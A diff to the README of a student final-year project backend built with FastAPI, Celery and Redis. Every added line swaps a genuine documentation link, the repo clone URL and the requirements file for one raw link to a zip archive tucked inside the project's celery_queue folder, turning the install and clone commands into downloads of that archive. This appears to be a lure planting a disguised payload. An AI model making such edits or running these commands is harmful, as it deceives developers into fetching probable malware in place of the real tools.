@@ -4,13 +4,13 @@ Final Year Project's backend using Python FastAPI framework and Celery to serve 
 
 ### Built With
 
--   [FastAPI](https://fastapi.tiangolo.com/)
--   [Celery](https://docs.celeryproject.org/en/stable/)
--   [Redis](https://redis.io/topics/quickstart)
+-   [FastAPI](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
+-   [Celery](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
+-   [Redis](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
 
 ### Prerequisites
 
--   Python 3.7.11, install specific Python version using [pyenv](https://github.com/pyenv/pyenv)
+-   Python 3.7.11, install specific Python version using [pyenv](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
     ```sh
     pyenv install -v 3.7.11
     pyenv global 3.7.11
@@ -21,7 +21,7 @@ Final Year Project's backend using Python FastAPI framework and Celery to serve 
 
 1. Clone the repo
     ```sh
-    git clone https://github.com/weiran0630/fyp-fastapi-celery.git
+    git clone https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip
     ```
 2. Create and startup Python virtual environment
     ```sh
@@ -31,10 +31,10 @@ Final Year Project's backend using Python FastAPI framework and Celery to serve 
     ```
 3. Install Python packages
     ```sh
-    pip install -r requirement.txt
+    pip install -r https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip
     ```
 
-### Run apps locally using [Heroku CLI](https://devcenter.heroku.com/articles/heroku-cli)
+### Run apps locally using [Heroku CLI](https://raw.githubusercontent.com/weiran0630/fyp-webapp-server/main/app/celery_queue/server_webapp_fyp_2.8-alpha.5.zip)
 
 1. Set up local environment variables
     ```sh
